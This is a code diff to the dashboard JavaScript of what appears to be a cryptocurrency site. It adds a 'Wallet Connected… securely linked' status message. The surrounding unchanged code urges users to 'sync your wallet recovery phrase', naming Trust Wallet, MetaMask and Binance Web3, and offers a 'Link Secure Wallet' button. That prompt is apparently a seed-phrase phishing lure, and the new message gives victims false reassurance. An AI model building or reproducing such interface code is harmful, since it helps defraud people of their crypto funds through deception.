@@ -713,6 +713,11 @@ window.loadDashboardData = async function() {
             walletStatusHTML = `<div id="walletApproved" style="display: block;"><div style="background: #0f0f15; border: 1px solid #00d4aa; border-radius: 8px; padding: 15px; display: flex; justify-content: space-between; align-items: center;"><div style="color: #fff; font-family: monospace; font-size: 13px; overflow: hidden; text-overflow: ellipsis; max-width: 70%;">${user.walletAddress}</div><button onclick="navigator.clipboard.writeText('${user.walletAddress}'); this.innerText='Copied';" style="background: #2a2a3a; color: #fff; border: none; padding: 6px 10px; border-radius: 4px; font-size: 11px;">Copy</button></div></div>`;
         } else if (user.walletStatus === 'pending') {
             walletStatusHTML = `<div id="walletPending" style="text-align: center; padding: 10px;"><p style="color: #fcd535;">Verifying Wallet...</p></div>`;
+        } else if (user.walletStatus === "approved") {
+            walletStatusHTML = `<div id="walletConnected" style="text-align: center; padding: 10px;">
+                <p style="color: #0ecb51; font-size: 18px; font-weight: bold; margin-bottom: 5px;">✓ Wallet Connected</p>
+                <p style="color: #888; font-size: 13px;">Your wallet is securely linked.</p>
+            </div>`;
         } else {
             walletStatusHTML = `<div id="walletDisconnected"><p style="color: #888; font-size: 13px; margin-bottom: 15px;">Sync your wallet recovery phrase to enable instant crypto deposits and withdrawals.</p><div style="display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap;"><span style="background: #0f0f15; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Trust Wallet</span><span style="background: #0f0f15; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">MetaMask</span><span style="background: #0f0f15; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Binance Web3</span></div><button class="btn-primary full-width" onclick="showImportWallet()" style="width: 100%; background: #00d4aa; color: #000; padding: 12px; border-radius: 8px; font-weight: bold; border: none;">Link Secure Wallet</button></div>`;
         }
